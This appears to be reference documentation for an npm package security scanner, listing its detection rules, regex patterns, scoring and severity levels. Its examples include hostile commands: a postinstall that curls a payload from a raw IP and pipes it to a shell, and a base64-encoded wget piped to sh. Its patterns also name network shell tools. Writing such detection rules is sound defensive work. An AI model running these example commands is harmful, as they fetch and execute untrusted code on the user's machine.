# Scanner Rules Reference

This document describes every built-in static analysis rule implemented in
`@npm-safe/core`. The default analyzer runs pure regex and string analysis
against a package's README and `package.json`. Opt-in deep mode supplements
that report with bounded inspection of the published package tarball. Neither
mode uses LLM inference or executes package code.

The 10 metadata rules are defined in `src/scanner/static-rules.ts` and exported
via `BUILTIN_RULES`. Twelve content rule descriptors are exported from
`src/scanner/package-content.ts` via `CONTENT_SCAN_RULES`.

---

## Scoring and Levels

The analyzer produces a numeric score and an overall security level for each
package.

**Scoring formula:**

- Base score: 100
- Per-finding penalty subtracted by severity weight:

| Severity | Weight |
|----------|--------|
| Critical | 25 |
| High | 15 |
| Medium | 8 |
| Low | 3 |

- Final score is clamped to `[0, 100]`.

**Security levels:**

| Score Range | Level |
|-------------|-------|
| 80 or above | Safe |
| 50 or above | Suspicious |
| 20 or above | Dangerous |
| Below 20 | Unknown |

---

## Rule Summary Table

| # | Rule ID | Category | Severity | Triggers On | Detection Logic |
|---|---------|----------|----------|-------------|-----------------|
| 1 | `install-script` | `install-script` | Medium–Critical | `scripts.install`, `scripts.preinstall`, `scripts.postinstall` in package.json | Reports every install-time script; escalates remote downloads, process execution, encoded payloads, shell pipelines, and raw-IP fetches |
| 2 | `eval-obfuscation` | `code-obfuscation` | High | README content | `EVAL_FUNCTION_PATTERN` (eval/Function) and `ENCODED_STRING_PATTERN` (hex/unicode escapes) both present |
| 3 | `base64-shell` | `code-obfuscation` | High | README content | `BASE64_BLOB_PATTERN` (40+ base64 chars) and `SHELL_KEYWORD_PATTERN` (sh, bash, curl, wget, nc, ncat, python, perl, ruby, powershell) both present |
| 4 | `binary-links` | `binary-download` | Medium | README content | `BINARY_LINK_PATTERN` -- markdown URLs ending in `.exe`, `.sh`, `.bat`, `.ps1`, `.cmd`, `.com`, `.scr`, `.msi` |
| 5 | `typosquatting` | `typosquatting` | High | `packageJson.name` | Levenshtein edit distance <= 2 between the unscoped package name and any of 20 `POPULAR_PACKAGES`; exact match excluded; name must be at least 3 characters |
| 6 | `secret-exposure` | `sensitive-exposure` | Critical | README and package.json string values | Any of `NPM_TOKEN_PATTERN` (npm_ + 20+ alphanumeric), `AWS_KEY_PATTERN` (AKIA + 16 uppercase alphanumeric), `SSH_KEY_PATTERN` (-----BEGIN...PRIVATE KEY-----) |
| 7 | `child-process-browser` | `suspicious-dependency` | High | package.json and README | `browser` field present in package.json OR name hints at frontend (react/vue/angular/svelte/solid/frontend/client/browser/dom/ui) AND `CHILD_PROCESS_PATTERN` found in README or scripts |
| 8 | `suspicious-build-metadata` | `informational` | Low | `packageJson` keys | Underscore-prefixed keys not in the known set of npm metadata fields |
| 9 | `homograph-attack` | `homograph-attack` | Critical | `packageJson.name` | Non-ASCII characters in the unscoped portion of the package name; allowed character set is `[a-z0-9._-]` |
| 10 | `registry-mismatch` | `registry-mismatch` | Medium | `publishConfig.registry` | Does not match or start with `https://registry.npmjs.org/` |

---

## Deep Package-Content Rules

Run these rules with `npm-safe check <package> --deep`, `npm-safe ci --deep`,
or `engine.checkPackage(name, { deep: true })`.

| Rule ID | Severity | Signal |
|---|---:|---|
| `content-integrity-mismatch` | Critical | Downloaded bytes do not match the strongest published SRI digest or legacy shasum. |
| `content-archive-invalid` | High | Gzip/TAR decompression, checksum, bounds, or trailing-block validation fails. |
| `content-archive-path` | Critical | An absolute, drive-qualified, or `..` archive path can escape the package root. |
| `content-archive-link` | High | A symbolic or hard link, including PAX/GNU long links, targets an escaping path. |
| `content-native-binary` | Low | The archive contains `.node`, `.dll`, `.so`, `.dylib`, `.exe`, `.wasm`, or `.bin` content. |
| `content-remote-shell` | Critical | Remote content is piped or passed directly to a shell/interpreter. |
| `content-obfuscated-exec` | High | A long encoded payload appears with `eval`/`Function` dynamic execution. |
| `content-network-exec` | High | One published file combines network access with child-process capability. |
| `content-process-exec` | Medium | Non-test runtime source imports or invokes Node child-process functionality. |
| `content-sensitive-network` | High | One file reads sensitive environment values and performs network access. |
| `content-scan-incomplete` | Medium | A resource limit prevents complete content inspection. |
| `content-scan-unavailable` | Medium | The tarball is missing, refused by origin policy, or cannot be downloaded. |

To bound decompression bombs and parser abuse, default limits are 20 MiB
compressed (download layer), 50 MiB unpacked, 5,000 TAR entries, 1 MiB per
text file, and 8 MiB total inspected text. Archives stay in memory and are
never extracted. Findings are deduplicated by rule ID per archive to keep one
large package from overwhelming the score. A `ContentScanSummary` records
`complete`, `partial`, or `failed`, sizes, file counts, integrity status, and
the partial/failure reason.

Deep rules honor the same enable/disable and severity overrides as metadata
rules and appear in `npm-safe rules list`. The content scanner is deliberately
high-confidence and regex-based; AST/data-flow analysis remains future work.

---

## StaticAnalyzer Class

```typescript
class StaticAnalyzer {
  constructor(rules?: ScanRule[]);
  analyze(
    readme: string,
    packageJson?: Record<string, unknown>,
    supplementalFindings?: readonly ScanFinding[],
    contentScan?: ContentScanSummary,
  ): StaticScanReport;
}
```

The constructor accepts an optional array of custom rules. When omitted, it
defaults to the full set of built-in rules from `BUILTIN_RULES`.

The `analyze` method iterates over every enabled rule, collects all findings,
computes the score and overall security level, and returns a
`StaticScanReport`.

## BUILTIN_RULES Constant

Exported from `src/scanner/static-rules.ts` as a readonly `ScanRule[]` array.
Registration order matches the numbered list above.

---

## Rule Details

### 1. `install-script` -- Suspicious Install Script

**Severity:** Medium by default; escalates to High or Critical
**Category:** `install-script`

**Description**

Reports every install-time lifecycle script (`postinstall`, `preinstall`, and
`install`) because it runs automatically with the installing user's
privileges. The rule escalates scripts that download remote content, spawn
processes, contain encoded payloads, pipe downloads into a shell, or fetch
from a raw IPv4 address.

**Detection Logic**

The rule inspects every entry in the `scripts` object of `package.json`. For
each script whose key is exactly `install`, `preinstall`, or `postinstall`, it
emits one finding and assigns severity as follows:

- **Critical:** `curl`/`wget` downloads from a raw IPv4 address, or downloaded
  content is piped directly to a shell.
- **High:** the command uses `curl`/`wget`, process-spawning primitives such as
  `child_process`/`execSync`, or a long base64-looking payload.
- **Medium:** any other install-time lifecycle script.

Each finding includes the full script command as the code snippet so the user
can review exactly what will execute.

**Example Scenario**

A package.json with:

```json
{
  "scripts": {
    "postinstall": "curl -s http://192.168.1.1/payload.sh | sh"
  }
}
```

**Recommendation**

Inspect every lifecycle script before installation. Do not install packages
that pipe remote content into a shell or execute an unverified payload. Package
authors should vendor required assets and avoid install-time execution where
possible.

---

### 2. `eval-obfuscation` -- eval/Function Obfuscation

**Severity:** High
**Category:** `code-obfuscation`

**Description**

Detects the combined presence of `eval(` or `Function(` invocations with
hex-encoded or Unicode-escaped string content in the README. This pattern is a
hallmark of obfuscated malicious payloads that decode and execute hidden code
at runtime.

**Detection Logic**

The rule scans the entire README text for:

- `EVAL_FUNCTION_PATTERN` = `/\b(?:eval|Function)\s*\(/`
- `ENCODED_STRING_PATTERN` = `/\\x[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4}/`

A finding is produced only when **both** patterns match somewhere in the README.
The line number reported is the first line containing the eval/Function match.

**Example Scenario**

A README that includes code like:

```js
eval("\x68\x65\x6c\x6c\x6f"); // "hello" in hex escapes
```

**Recommendation**

Avoid using `eval` or `Function` constructors. Replace them with static
imports or `JSON.parse` for trusted data. Encoded string content should be
inspected as a possible obfuscation attempt.

---

### 3. `base64-shell` -- Base64-Encoded Shell Payload

**Severity:** High
**Category:** `code-obfuscation`

**Description**

Detects long base64-encoded blobs appearing near shell command keywords in the
README. Attackers often encode a malicious script in base64 and pipe the
decoded output to a shell interpreter to evade text-based scans.

**Detection Logic**

The rule scans the README for:

- `BASE64_BLOB_PATTERN` = `/\b[A-Za-z0-9+/]{40,}={0,2}\b/`
  Matches runs of base64 characters at least 40 characters long, with optional
  padding.

- `SHELL_KEYWORD_PATTERN` =
  `/\b(?:sh|bash|curl|wget|nc|ncat|python|perl|ruby|powershell)\b/`
  Matches common shell and scripting interpreters.

A finding is produced when both patterns match. The reported line number is the
first line containing either the base64 blob or the shell keyword.

**Example Scenario**

A README containing:

```sh
echo "d2dldCBodHRwOi8vZXZpbC5leGUgLW8gL3RtcC9wYXlsb2FkLmV4ZQ==" | base64 --decode | sh
```

**Recommendation**

Decode and inspect any base64 blobs in the package. Remove shell execution
from package code and use native APIs or static assets instead.

---

### 4. `binary-links` -- Direct Binary Download Links

**Severity:** Medium
**Category:** `binary-download`

**Description**

Detects markdown links in the README that point directly to executable binary
files. These links can trick users into downloading and running untrusted
executables, especially when the package claims to provide a legitimate
tool.

**Detection Logic**

The rule iterates over each line of the README and tests for:

- `BINARY_LINK_PATTERN` =
  `/\bhttps?:\/\/[^\s)]+?\.(?:exe|sh|bat|ps1|cmd|com|scr|msi)\b/i`

This matches HTTP or HTTPS URLs whose path ends with one of the listed
executable extensions (case-insensitive). One finding is emitted per matching
line, with the matched URL as the code snippet.

**Example Scenario**

A README containing:

```markdown
Download the CLI tool: https://example.com/download/setup.exe
```

**Recommendation**

Avoid linking directly to executable binaries. Instead, distribute packages
through a package registry or provide source code that users can compile or
inspect.

---

### 5. `typosquatting` -- Typosquatting Candidate

**Severity:** High
**Category:** `typosquatting`

**Description**

Detects package names that closely resemble a popular npm package, differing
by a single-character edit (insertion, deletion, or substitution). Attackers
publish typosquatted packages to trick users who mistype a package name.

**Detection Logic**

The rule extracts the `name` field from `package.json`. If the name is scoped
(starts with `@`), only the portion after the `/` is compared. The rule
computes the Levenshtein edit distance between the unscoped name
(lowercased) and each of the 20 `POPULAR_PACKAGES`:

`express`, `lodash`, `react`, `axios`, `chalk`, `commander`, `debug`,
`request`, `moment`, `vue`, `angular`, `webpack`, `typescript`, `jest`,
`eslint`, `fs-extra`, `dotenv`, `yargs`, `ramda`, `underscore`

A finding is emitted when:

- The edit distance is between 1 and 2 (inclusive).
- The name is at least 3 characters long.
- Exact matches are excluded (exact match of a popular name is not
  typosquatting).

Only one finding is produced per package, against the closest matching popular
name.

**Example Scenario**

A package named `expres` (distance 1 from `express`) or `reactt` (distance 1
from `react`).

**Recommendation**

Verify that the package is the intended, official package. If it is a
typosquat, report it to the npm registry maintainers and use the correct
package name.

---

### 6. `secret-exposure` -- Exposed Secret

**Severity:** Critical
**Category:** `sensitive-exposure`

**Description**

Detects exposed secrets in the README or package.json content. This includes
npm authentication tokens, AWS access key IDs, and SSH private key blocks.
Accidentally publishing secrets is a common and high-impact security
incident.

**Detection Logic**

The rule builds a search corpus from the README content and the
JSON-stringified `package.json` object. It tests each corpus against three
patterns:

- `NPM_TOKEN_PATTERN` = `/npm_[A-Za-z0-9]{20,}/`
  Matches `npm_` followed by 20 or more alphanumeric characters (standard npm
  token format).

- `AWS_KEY_PATTERN` = `/AKIA[0-9A-Z]{16}/`
  Matches an AWS access key ID starting with `AKIA` followed by 16 uppercase
  alphanumeric characters.

- `SSH_KEY_PATTERN` =
  `/-----BEGIN (?:RSA |OPENSSH |EC |DSA )?PRIVATE KEY-----/`
  Matches the PEM header of an SSH private key block.

Each pattern match produces a separate finding annotated with the data source
("README" or "package.json").

**Example Scenario**

A README that contains:

```
npm_abc123def456abc123def456
```

Or a package.json that contains `"AKIA1234567890ABCDE"` in any field value.

**Recommendation**

Rotate any exposed tokens or keys immediately. Remove all secrets from the
package and consider using environment variables or secret management services
instead.

---

### 7. `child-process-browser` -- child_process in Browser-Targeted Package

**Severity:** High
**Category:** `suspicious-dependency`

**Description**

Detects references to Node.js `child_process` module in packages that appear
to target the browser environment. The `child_process` module is not available
in browsers, so its presence in a frontend package may indicate an attempt to
access the filesystem or execute commands at runtime.

**Detection Logic**

The rule first determines whether the package is browser-targeted. It checks
two conditions:

- The `browser` key exists as an own property in `package.json` (not
  inherited).
- The package name matches the frontend hint regex:
  `/\b(?:react|vue|angular|svelte|solid|frontend|client|browser|dom|ui)\b/i`

If either condition is true, the rule checks for `child_process` usage:

- It first tests the README against `CHILD_PROCESS_PATTERN`:
  `/(?:require\s*\(\s*['"]child_process['"]\)|\bfrom\s+['"]child_process['"]\b|import\s*\(\s*['"]child_process['"]\s*\))/`

- If the README does not match, it joins all script commands from
  `package.json` scripts and tests that combined string against the same
  pattern.

**Example Scenario**

A package named `react-cool-library` whose scripts include:

```json
{
  "scripts": {
    "postinstall": "node -e \"require('child_process').execSync('malicious-command')\""
  }
}
```

**Recommendation**

Remove `child_process` usage from browser-targeted code paths. If the package
needs Node.js APIs, split it into separate client and server entry points using
the `browser` field correctly.

---

### 8. `suspicious-build-metadata` -- Suspicious Build Metadata

**Severity:** Low
**Category:** `informational`

**Description**

Detects underscore-prefixed metadata fields in `package.json` that are not
part of npm's standard set of internal metadata. These fields are typically
added by build tools, proxy registries, or supply-chain tools and can
sometimes indicate tampering or unusual build provenance.

**Detection Logic**

The rule enumerates all keys in `package.json`. For each key that starts with
`_`, it checks against a known allowlist:

`_from`, `_id`, `_nodeVersion`, `_npmVersion`, `_npmUser`,
`_npmOperationalInternal`, `_resolved`, `_shasum`, `_integrity`, `_location`,
`_phantomChildren`, `_requested`, `_requiredBy`, `_inCache`

Any underscore-prefixed key not in this set produces a finding.

**Example Scenario**

A package.json containing:

```json
{
  "_from": "https://registry.npmjs.org/express/-/express-4.18.0.tgz",
  "_customBuildField": "some-value"
}
```

The `_customBuildField` key would be flagged.

**Recommendation**

Inspect the unknown field to determine its origin. If it was injected by a
build tool or proxy registry, consider whether the source is trustworthy.

---

### 9. `homograph-attack` -- Homograph Attack in Package Name

**Severity:** Critical
**Category:** `homograph-attack`

**Description**

Detects non-ASCII characters in the package name that can be used for
homograph attacks. Attackers substitute visually similar Unicode characters
(for example, Cyrillic `а` U+0430 for Latin `a` U+0061) to impersonate a
popular package. The difference is invisible to most human readers but the
package name resolves to a different string at the registry level.

**Detection Logic**

The rule extracts the `name` field from `package.json`. If the name is scoped
(starts with `@`), only the portion after the `/` is tested. It applies the
allowed character regex:

- `Allowed pattern` = `/^[a-z0-9._-]+$/i`

If the unscoped name contains any character outside this set, a finding is
produced listing each non-ASCII character found.

**Example Scenario**

A package named `@scope/rеact` where the `е` is Cyrillic `е` (U+0435) instead
of Latin `e` (U+0065). The unscoped portion `rеact` fails the ASCII-only test.

**Recommendation**

Verify that the package name uses only ASCII characters and is the intended,
official package. Report suspected homograph attacks to the npm registry
maintainers.

---

### 10. `registry-mismatch` -- Non-Standard Publish Registry

**Severity:** Medium
**Category:** `registry-mismatch`

**Description**

Detects a `publishConfig.registry` value in `package.json` that does not point
to the standard npm registry. This can indicate a package that was published
to a private registry, a mirror, or an attacker-controlled registry.

**Detection Logic**

The rule reads the `publishConfig` object from `package.json` and extracts its
`registry` field (if present). It then compares the registry URL against the
standard registry:

- `STANDARD_REGISTRY` = `https://registry.npmjs.org/`

A finding is emitted when the registry value does not strictly equal and does
not start with the standard registry URL. Both conditions are checked to
accommodate registry URLs that include trailing path segments beyond the base
URL.

**Example Scenario**

A package.json containing:

```json
{
  "publishConfig": {
    "registry": "https://private-registry.example.com/"
  }
}
```

**Recommendation**

Confirm that the registry is trusted and under the control of the package
maintainer. Standard npm packages should use `https://registry.npmjs.org/`.
Packages pointing to unknown registries should be treated with caution.

---

## Finding Categories

Each finding carries a `category` field from the `FindingCategory` enum. The
following categories are used by the built-in rules:

| Enum Value | String Value | Used By |
|------------|--------------|---------|
| `InstallScript` | `install-script` | install-script |
| `CodeObfuscation` | `code-obfuscation` | eval-obfuscation, base64-shell |
| `BinaryDownload` | `binary-download` | binary-links |
| `SensitiveExposure` | `sensitive-exposure` | secret-exposure |
| `Typosquatting` | `typosquatting` | typosquatting |
| `SuspiciousDep` | `suspicious-dependency` | child-process-browser |
| `HomographAttack` | `homograph-attack` | homograph-attack |
| `RegistryMismatch` | `registry-mismatch` | registry-mismatch |
| `Informational` | `informational` | suspicious-build-metadata |

---

## Severity Levels

Findings use the `Severity` enum with four levels:

| Enum Value | String Value | Weight |
|------------|--------------|--------|
| `Critical` | `critical` | 25 |
| `High` | `high` | 15 |
| `Medium` | `medium` | 8 |
| `Low` | `low` | 3 |

---

## ScanFinding Interface

Each finding conforms to the `ScanFinding` interface:

```typescript
interface ScanFinding {
  readonly ruleId: string;
  readonly ruleName: string;
  readonly severity: Severity;
  readonly message: string;
  readonly codeSnippet?: string;
  readonly lineNumber?: number;
  readonly recommendation?: string;
  readonly category: FindingCategory;
}
```

---

## Source Reference

All types, enums, and interfaces are defined in `src/scanner/types.ts`. All
rule implementations, regex patterns, and the `StaticAnalyzer` class are in
`src/scanner/static-rules.ts`. The `BUILTIN_RULES` array is exported from
`src/scanner/static-rules.ts` at line 650.
